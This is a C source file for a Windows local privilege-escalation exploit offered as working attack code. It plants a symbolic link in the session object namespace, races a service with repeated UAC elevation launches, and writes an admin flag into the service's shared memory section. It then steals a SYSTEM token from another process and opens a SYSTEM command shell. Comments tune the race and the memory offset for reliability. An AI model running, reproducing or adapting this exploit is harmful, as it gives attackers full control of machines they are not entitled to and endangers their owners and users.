#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

BOOL EnablePrivilege(LPCWSTR privName)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = {};

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    BOOL ok = LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid);
    if (ok) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        ok = (GetLastError() == ERROR_SUCCESS);
    }

    CloseHandle(hToken);
    return ok;
}

// Walk all processes and steal a primary token from the first SYSTEM-owned one.
// SeDebugPrivilege is required to open protected SYSTEM processes (winlogon, etc.).
HANDLE StealSystemToken()
{
    EnablePrivilege(SE_DEBUG_NAME);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return NULL;

    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE hSysToken = NULL;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = NULL;
            // TOKEN_ASSIGN_PRIMARY is required for CreateProcessWithTokenW.
            if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTok)) {
                BYTE buf[4096] = {};
                DWORD len = 0;
                if (GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                    PTOKEN_USER ptu = (PTOKEN_USER)buf;
                    if (IsWellKnownSid(ptu->User.Sid, WinLocalSystemSid)) {
                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                                SecurityImpersonation, TokenPrimary, &hSysToken))
                            printf("[+] Stolen SYSTEM token from PID %d (%ws)\n",
                                pe.th32ProcessID, pe.szExeFile);
                    }
                }
                CloseHandle(hTok);
            }
            CloseHandle(hProc);
        } while (!hSysToken && Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return hSysToken;
}

void SpawnSystemShell(HANDLE hSysToken)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.lpDesktop = (wchar_t*)L"WinSta0\\Default";

    wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";

    if (CreateProcessWithTokenW(hSysToken, LOGON_WITH_PROFILE, NULL, cmd,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] SYSTEM shell spawned (PID %d)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessWithTokenW failed: %d\n", GetLastError());
        printf("    (Needs SeImpersonatePrivilege — run from elevated or service context)\n");
    }
}

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi) };
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    shi.nShow = SW_HIDE;

    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 100; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    HANDLE hLink = NULL, hMapping = NULL, hThread = NULL;
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES linkAttr, targetAttr;

    // 1. BRIDGE: redirect the service's section creation to our target path.
    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&linkAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &targetName) != 0) {
        printf("[-] Symlink creation failed (already running, or session 0)\n");
        return 1;
    }
    printf("[+] Symlink planted in session %lu\n", sessionId);

    // 2. RACE: fire UAC elevation events on a high-priority thread to give the
    //    service repeated opportunities to map the redirected section.
    hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
    if (hThread) SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    // 3. HIJACK: wait for the service to create the section via the symlink,
    //    then map THE SAME BACKING STORE and write the poison flag.
    //
    //    Do NOT create a local section with CreateFileMappingW here.
    //    CreateFileMappingW("JoeyExploitSection") lands in the session namespace
    //    while NtOpenSection(\BaseNamedObjects\...) targets the global namespace —
    //    different backing stores. Writes to the local view never reach the service.
    //    We must open exactly what the service created via NtOpenSection.
    InitializeObjectAttributes(&targetAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &targetAttr) == 0) {
            void* pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
            if (pView) {
                // WinDbg-confirmed offset 0x48 for the IsAdmin flag in the service struct.
                // Validate before writing — a wrong offset on a mismatched build
                // would corrupt unrelated struct fields and likely BSoD.
                DWORD current = *((DWORD*)((unsigned char*)pView + 0x48));
                if (current == 0) {
                    *((DWORD*)((unsigned char*)pView + 0x48)) = 0x1;
                    printf("[+] Flag written at 0x48 — service view poisoned\n");
                } else if (current == 0x1) {
                    printf("[*] Flag at 0x48 already set — section may be stale\n");
                } else {
                    printf("[!] Unexpected value 0x%08X at 0x48 — wrong build? Skipping write\n", current);
                }
                UnmapViewOfFile(pView);
            }

            // Steal token immediately — do NOT sleep. The service process we need
            // is alive right now; an arbitrary Sleep() risks missing the window.
            bKeepRunning = FALSE;
            HANDLE hSysToken = StealSystemToken();
            if (hSysToken) {
                SpawnSystemShell(hSysToken);
                CloseHandle(hSysToken);
            } else {
                printf("[-] Could not obtain a SYSTEM token.\n");
            }
            break;
        }
    }

    // 4. TRIGGER: re-fire the elevation event to push the service back into
    //    the code path that reads the shared section and acts on the flag.
    SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
    retrigger.fMask = SEE_MASK_NOZONECHECKS;
    retrigger.lpVerb = L"runas";
    retrigger.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    retrigger.nShow = SW_HIDE;
    ShellExecuteEx(&retrigger);
    printf("[*] Retrigger fired\n");

cleanup:
    if (hThread) { WaitForSingleObject(hThread, 1000); CloseHandle(hThread); }
    if (hMapping) CloseHandle(hMapping);
    if (hLink)    CloseHandle(hLink);

    return 0;
}
